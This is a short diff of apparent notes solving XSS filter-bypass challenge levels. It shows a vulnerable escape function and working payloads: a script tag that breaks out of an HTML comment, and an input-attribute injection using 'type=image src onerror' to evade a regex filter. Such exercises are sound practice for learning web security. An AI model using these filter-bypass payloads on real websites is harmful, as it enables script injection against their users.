@@ -84,3 +84,14 @@ function escape(input) {
 }        
 payload
 --!><script>alert(1)</script> // inorder to end the comment --!>
+
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+}
+<input value="" type="text"> //here the type is text so we have to change it 
+bat"type=image src onerror
+="alert(1) //here &#61; not working 
